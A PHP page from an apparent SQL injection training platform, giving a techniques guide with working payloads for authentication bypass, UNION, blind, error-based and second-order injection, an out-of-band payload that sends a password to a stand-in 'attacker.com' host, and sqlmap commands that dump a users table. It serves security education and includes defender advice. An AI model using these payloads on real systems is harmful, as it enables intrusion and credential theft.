<?php
/**
 * SQL Injection Techniques Guide
 * SQL Injection Training Platform
 */

require_once '../config.php';
require_once '../includes/functions.php';

displayHeader('SQL Injection Techniques');
?>

<div class="card">
    <h2>🎯 SQL Injection Techniques Guide</h2>
    <p>A comprehensive guide to SQL injection techniques for educational purposes.</p>
</div>

<div class="card">
    <h3>1. Basic SQL Injection</h3>
    <p>The simplest form of SQL injection involves breaking out of the intended query structure.</p>
    
    <h4>Example Vulnerable Query:</h4>
    <div class="code-display">
        <pre>SELECT * FROM users WHERE username = '$username' AND password = '$password'</pre>
    </div>
    
    <h4>Attack Payloads:</h4>
    <code>' OR '1'='1</code> - Makes condition always true<br>
    <code>admin'--</code> - Comments out password check<br>
    <code>admin' #</code> - Alternative comment syntax<br>
    <code>' OR 1=1--</code> - Bypasses authentication
    
    <h4>Result:</h4>
    <div class="code-display">
        <pre>SELECT * FROM users WHERE username = 'admin'--' AND password = ''</pre>
    </div>
</div>

<div class="card">
    <h3>2. UNION-Based SQL Injection</h3>
    <p>Combines results from multiple SELECT statements to extract data from other tables.</p>
    
    <h4>Steps:</h4>
    <ol>
        <li><strong>Find column count:</strong> <code>' ORDER BY 1--</code>, <code>' ORDER BY 2--</code>, etc.</li>
        <li><strong>Test UNION:</strong> <code>' UNION SELECT 1,2,3,4--</code></li>
        <li><strong>Extract data:</strong> <code>' UNION SELECT username, password, email, id FROM users--</code></li>
    </ol>
    
    <h4>Example:</h4>
    <div class="code-display">
        <pre>-- Original query
SELECT id, name, price FROM products WHERE name LIKE '%laptop%'

-- Injected payload
' UNION SELECT id, username, password FROM users--

-- Resulting query
SELECT id, name, price FROM products WHERE name LIKE '%' UNION SELECT id, username, password FROM users--%'</pre>
    </div>
</div>

<div class="card">
    <h3>3. Boolean-Based Blind SQL Injection</h3>
    <p>Used when you can't see query results but can detect true/false conditions.</p>
    
    <h4>Concept:</h4>
    <p>Application behaves differently based on whether a condition is true or false.</p>
    
    <h4>Example Payloads:</h4>
    <code>1 AND 1=1</code> - Returns data (TRUE)<br>
    <code>1 AND 1=2</code> - Returns no data (FALSE)<br>
    <code>1 AND (SELECT COUNT(*) FROM users) > 0</code> - Test if table exists<br>
    <code>1 AND SUBSTRING((SELECT password FROM users WHERE id=1),1,1)='a'</code> - Extract first character
    
    <h4>Data Extraction:</h4>
    <div class="code-display">
        <pre>-- Test each character position
1 AND SUBSTRING((SELECT password FROM users WHERE id=1),1,1)='a'  -- FALSE
1 AND SUBSTRING((SELECT password FROM users WHERE id=1),1,1)='b'  -- FALSE
1 AND SUBSTRING((SELECT password FROM users WHERE id=1),1,1)='p'  -- TRUE!

-- Move to next character
1 AND SUBSTRING((SELECT password FROM users WHERE id=1),2,1)='a'  -- TRUE!</pre>
    </div>
</div>

<div class="card">
    <h3>4. Time-Based Blind SQL Injection</h3>
    <p>Uses database sleep functions to infer information based on response time.</p>
    
    <h4>MySQL Functions:</h4>
    <code>SLEEP(seconds)</code> - Delays execution<br>
    <code>BENCHMARK(count, expression)</code> - Repeats expression multiple times
    
    <h4>Example Payloads:</h4>
    <code>1 AND SLEEP(5)</code> - Delays 5 seconds if TRUE<br>
    <code>1 AND IF(1=1, SLEEP(5), 0)</code> - Conditional delay<br>
    <code>1 AND IF(SUBSTRING((SELECT password FROM users WHERE id=1),1,1)='a', SLEEP(3), 0)</code>
    
    <h4>Usage:</h4>
    <div class="code-display">
        <pre>-- If page delays, condition is TRUE
-- If no delay, condition is FALSE

-- Extract data character by character
1 AND IF(SUBSTRING((SELECT password FROM users WHERE id=1),1,1)='a', SLEEP(3), 0)
-- No delay = not 'a'

1 AND IF(SUBSTRING((SELECT password FROM users WHERE id=1),1,1)='p', SLEEP(3), 0)
-- 3 second delay = first character is 'p'!</pre>
    </div>
</div>

<div class="card">
    <h3>5. Error-Based SQL Injection</h3>
    <p>Extracts data through database error messages.</p>
    
    <h4>Example Payloads:</h4>
    <code>' AND 1=CONVERT(int, (SELECT @@version))--</code><br>
    <code>' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--</code>
    
    <h4>Why it works:</h4>
    <p>Trying to convert string data to integer causes an error that includes the string value.</p>
</div>

<div class="card">
    <h3>6. Second-Order SQL Injection</h3>
    <p>Payload is stored in database and executed later in a different context.</p>
    
    <h4>Example:</h4>
    <ol>
        <li>Register with username: <code>admin'--</code></li>
        <li>Username is stored in database</li>
        <li>Later, application uses this username in a query without escaping</li>
        <li>Injection executes when username is retrieved and used</li>
    </ol>
</div>

<div class="card">
    <h3>7. Out-of-Band SQL Injection</h3>
    <p>Uses database features to send data to attacker-controlled server.</p>
    
    <h4>Example (MySQL):</h4>
    <code>'; SELECT LOAD_FILE(CONCAT('\\\\\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\\\share'))--</code>
    
    <h4>Note:</h4>
    <p>Requires specific database permissions and features. Not always available.</p>
</div>

<div class="card">
    <h3>🛠️ Common SQL Injection Tools</h3>
    
    <h4>sqlmap</h4>
    <p>Automated SQL injection tool</p>
    <div class="code-display">
        <pre>sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D database_name --tables
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump</pre>
    </div>
    
    <h4>Manual Testing</h4>
    <p>Browser, Burp Suite, or curl for manual injection testing</p>
</div>

<div class="card">
    <h3>🔍 Detection Techniques</h3>
    
    <h4>For Attackers (Ethical Testing):</h4>
    <ul>
        <li>Test with single quote (<code>'</code>) to see if errors occur</li>
        <li>Try boolean conditions (<code>AND 1=1</code> vs <code>AND 1=2</code>)</li>
        <li>Use time delays to confirm injection</li>
        <li>Look for differences in application behavior</li>
    </ul>
    
    <h4>For Defenders:</h4>
    <ul>
        <li>Use Web Application Firewalls (WAF)</li>
        <li>Implement input validation</li>
        <li>Use prepared statements</li>
        <li>Monitor for suspicious patterns in logs</li>
        <li>Regular security audits and penetration testing</li>
    </ul>
</div>

<div class="card">
    <h3>⚖️ Ethical Guidelines</h3>
    
    <h4>✅ Authorized Testing:</h4>
    <ul>
        <li>Your own applications</li>
        <li>Training platforms (like this one)</li>
        <li>Bug bounty programs with explicit permission</li>
        <li>Penetration testing with written authorization</li>
    </ul>
    
    <h4>❌ Unauthorized Testing:</h4>
    <ul>
        <li>Any system you don't own or have permission to test</li>
        <li>Production systems without authorization</li>
        <li>Testing "just to see if it works"</li>
    </ul>
    
    <h4>Legal Consequences:</h4>
    <p><strong>Unauthorized access to computer systems is illegal in most countries.</strong> Penalties can include:</p>
    <ul>
        <li>Criminal charges</li>
        <li>Fines</li>
        <li>Imprisonment</li>
        <li>Civil lawsuits</li>
    </ul>
</div>

<div class="card">
    <h3>📚 Further Learning</h3>
    
    <h4>Resources:</h4>
    <ul>
        <li><a href="https://owasp.org/www-community/attacks/SQL_Injection" target="_blank">OWASP SQL Injection Guide</a></li>
        <li><a href="https://portswigger.net/web-security/sql-injection" target="_blank">PortSwigger SQL Injection Tutorial</a></li>
        <li><a href="https://www.hacksplaining.com/exercises/sql-injection" target="_blank">Hacksplaining SQL Injection</a></li>
    </ul>
    
    <h4>Practice Platforms:</h4>
    <ul>
        <li>This platform (SQL Injection Training)</li>
        <li>DVWA (Damn Vulnerable Web Application)</li>
        <li>WebGoat</li>
        <li>HackTheBox</li>
        <li>TryHackMe</li>
    </ul>
</div>

<div class="card">
    <p><a href="<?php echo BASE_URL; ?>/index.php" class="btn btn-primary">Back to Home</a></p>
    <p><a href="secure_examples.php" class="btn btn-success">View Secure Code Examples</a></p>
</div>

<?php displayFooter(); ?>
